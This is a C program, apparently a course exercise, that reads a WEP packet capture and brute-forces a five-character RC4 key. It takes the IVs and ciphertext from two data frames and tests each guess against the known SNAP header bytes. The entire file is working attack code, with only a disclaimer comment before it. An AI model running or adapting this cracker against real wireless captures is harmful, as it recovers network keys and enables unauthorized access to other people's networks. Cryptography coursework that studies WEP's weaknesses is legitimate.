//This code was written for academic purposes only and never used with maliciuos intentions.
//I'm not responsible for any users actions with this code.


#include <stdio.h>
#include <string.h>
#include <pcap/pcap.h>
#include <openssl/rc4.h>

typedef unsigned char u8;

char err[PCAP_ERRBUF_SIZE];

const PACKET_SIZE_INCLUDE_4_DATA = 32;

static void PrintHex(char *s, u8 *buf, int len)
{
    printf("%s", s);
    for (int i = 0; i < len; ++i)
        printf("%02x ", buf[i]);
    printf("\n");
}

int main(int argc, char **argv)
{
    pcap_t *pcap = pcap_open_offline("wep.pcap", err);
    struct pcap_pkthdr header;
    const u8 *packet;

    // First data packet:
    for (packet = pcap_next(pcap, &header); packet[0] != 8 ;packet = pcap_next(pcap, &header))
    {}
    const u8 data1_packet[PACKET_SIZE_INCLUDE_4_DATA];
    memcpy(data1_packet, packet, PACKET_SIZE_INCLUDE_4_DATA);
    // PrintHex("data1: ", data1_packet, PACKET_SIZE_INCLUDE_4_DATA);

    // Second data packet:
    for (packet = pcap_next(pcap, &header); packet[0] != 8 ;packet = pcap_next(pcap, &header))
    {}
    const u8 data2_packet[PACKET_SIZE_INCLUDE_4_DATA];
    memcpy(data2_packet, packet, PACKET_SIZE_INCLUDE_4_DATA);
    // PrintHex("data2: ", data2_packet, PACKET_SIZE_INCLUDE_4_DATA);

    // Copying IV from data1_packet and data2_packet to iv1 and iv2
    // IV's offset is 24 bytes in RC4 protocol
    // Copying packet's data from data1_packet and data2_packetto data1 and data2
    // Packet's data offset is 28 bytes in RC4 protocol
    u8 iv1[3],iv2[3], data1[4], data2[4];
    memcpy(iv1, data1_packet + 24, 3);
    memcpy(data1, data1_packet + 28, 4);
    memcpy(iv2, data2_packet + 24, 3);
    memcpy(data2, data2_packet + 28, 4);
    // PrintHex("iv1: ", iv1, 3);
    // PrintHex("data1: ", data1, 4);
    // PrintHex("iv2: ", iv2, 3);
    // PrintHex("data2: ", data2, 4);

    int counter1 = 0, counter2 = 0;
    u8 secret_key[8];
    
    // Trying to crack RC4 secret key with brute force
    // Iterating through all printable code (all ascii characters without control character) combination for 5 digit secret key
    for (secret_key[3] = 0x20; secret_key[3] <= 0x7f; secret_key[3]++)
    for (secret_key[4] = 0x20; secret_key[4] <= 0x7f; secret_key[4]++)
    for (secret_key[5] = 0x20; secret_key[5] <= 0x7f; secret_key[5]++)
    for (secret_key[6] = 0x20; secret_key[6] <= 0x7f; secret_key[6]++)
    for (secret_key[7] = 0x20; secret_key[7] <= 0x7f; secret_key[7]++)
    {
        // RC4_KEY object to hold secret_key and iv
        RC4_KEY key;
        u8 p[4];
        // Copying 3 digits from iv1 to secret_key
        memcpy(secret_key, iv1, 3);
        // Setting RC4 key
        RC4_set_key(&key, 8, secret_key); 
        RC4(&key, 4, data1, p);
        // If there is a match to the first packet than increment counter1
        if (memcmp(p, "\xaa\xaa\x03\x00", 4) == 0)
            counter1++;
        else
            // If not than continue to the next combination
            continue;
        // Copying 3 digits from iv2 to secret_key
        memcpy(secret_key, iv2, 3);
        // Setting RC4 key
        RC4_set_key(&key, 8, secret_key); 
        RC4(&key, 4, data2, p);
        // If there is a match to the second packet than increment counter2
        if (memcmp(p, "\xaa\xaa\x03\x00", 4) == 0)
        {
            counter2++;
            // Print RC4 secret key
            PrintHex("Secret key: ", secret_key, 8);
        }
    }
    // Prints how many keys suited for packet1 and packet2
    printf("keys for data1: %d\n", counter1);
    printf("keys for data2: %d", counter2);
}
